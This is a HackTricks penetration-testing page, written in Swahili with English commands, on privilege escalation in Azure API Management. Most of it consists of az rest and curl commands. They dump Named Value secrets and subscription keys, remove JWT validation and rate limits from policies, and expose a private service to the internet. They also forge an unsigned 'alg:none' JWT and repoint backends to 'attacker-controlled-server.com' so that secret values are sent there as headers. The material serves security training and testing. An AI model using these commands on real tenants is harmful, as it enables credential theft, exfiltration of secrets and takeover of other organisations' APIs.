# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

Shambulio linahusisha kufikia sensitive secrets zilizohifadhiwa katika Azure API Management Named Values, ama kwa moja kwa moja kupata secret values au kwa kutumia vibaya permissions ili kupata Key Vaultâ€“backed secrets kupitia managed identities.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Kwa kila subscription, mshambuliaji anaweza kupata subscription keys kwa kutumia listSecrets endpoint kwa njia ya POST:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
Jibu linajumuisha subscription primary key (primaryKey) na secondary key (secondaryKey). Kwa kutumia vifunguo hivi, mshambuliaji anaweza kuthibitisha utambulisho na kufikia APIs zilizochapishwa kupitia API Management Gateway:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
Mshambuliaji anaweza kufikia APIs zote na bidhaa zinazohusishwa na usajili. Ikiwa usajili una ufikiaji wa bidhaa au APIs nyeti, mshambuliaji anaweza kupata taarifa za siri au kufanya operesheni zisizoruhusiwa.

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

Kwanza, mshambuliaji anapata sera ya sasa ya API:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
Mshambuliaji anaweza kubadilisha sera kwa njia mbalimbali kulingana na malengo yake. Kwa mfano, ili kuzima authentication, ikiwa sera inajumuisha JWT token validation, mshambuliaji anaweza kuondoa au comment out sehemu hiyo:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
Ili kuondoa udhibiti wa rate limiting na kuruhusu mashambulizi ya denial-of-service, mshambuliaji anaweza kuondoa au kuweka kama maoni sera za quota na rate-limit:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Ili kubadilisha backend route na kuelekeza trafiki kwa server inayodhibitiwa na mshambuliaji:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
Mshambuliaji kisha anatumia sera iliyohaririwa. Mwili wa ombi lazima uwe kitu cha JSON kinachojumuisha sera kwa muundo wa XML:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## JWT Validation Misconfiguration

Mshambuliaji anahitaji kujua kwamba API inatumia uhalali wa token za JWT na kwamba sera imepangwa vibaya. Sera za uhalali za JWT zilizopangwa vibaya zinaweza kuwa na `require-signed-tokens="false"` au `require-expiration-time="false"`, ambayo inaruhusu huduma kukubali token zisizosainiwa au token ambazo hazijaisha kamwe.

Mshambuliaji huunda token ya JWT yenye madhara kwa kutumia none algorithm (unsigned):
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
Mshambuliaji anatuma ombi kwa API akitumia token hasidi:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Ikiwa sera imepangwa vibaya na `require-signed-tokens="false"`, huduma itakubali token isiyosainiwa. Mshambulizi pia anaweza kuunda token bila expiration claim ikiwa `require-expiration-time="false"`.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
Mshambulizi kwanza anakagua usanidi wa mtandao wa sasa wa huduma:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
Mshambuliaji anapitia jibu la JSON ili kuthibitisha thamani za `publicNetworkAccess` na `virtualNetworkType`. Ikiwa `publicNetworkAccess` imewekwa kuwa false au `virtualNetworkType` imewekwa kuwa Internal, huduma imewekwa kwa ufikiaji wa kibinafsi.

Ili kufunua huduma kwa Intaneti, mshambuliaji lazima abadilishe mipangilio yote miwili. Ikiwa huduma inaendesha katika mode ya ndani (`virtualNetworkType: "Internal"`), mshambuliaji anaiweka kuwa None au External na kuwezesha ufikiaji wa mtandao wa umma. Hii inaweza kufanywa kwa kutumia Azure Management API:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
Baada `virtualNetworkType` inapowekwa kuwa `None` au `External` na `publicNetworkAccess` ikiwa imewezeshwa, huduma na API zake zote zinaweza kupatikana kutoka kwenye Internet, hata kama hapo awali zililindwa nyuma ya mtandao wa kibinafsi au private endpoints.

## `Microsoft.ApiManagement/service/backends/write`
Mshambuliaji awali huorodhesha backends zilizopo ili kubaini ipi ya kubadilisha:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
Attacker anapata usanidi wa sasa wa backend anayotaka kuibadilisha:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
Mshambuliaji anabadilisha backend URL ili kuielekeza kwenye server wanayodhibiti. Kwanza, wanapata ETag kutoka kwa jibu la awali na kisha wanaposasisha backend:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Vinginevyo, mshambuliaji anaweza kusanidi backend headers ili exfiltrate Named Values containing secrets. Hii inafanywa kupitia backend credentials configuration:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Kwa usanidi huu, Named Values zinatumwa kama headers katika maombi yote kwenda kwa attacker-controlled backend, kuruhusu exfiltration ya sensitive secrets.

{{#include ../../../banners/hacktricks-training.md}}
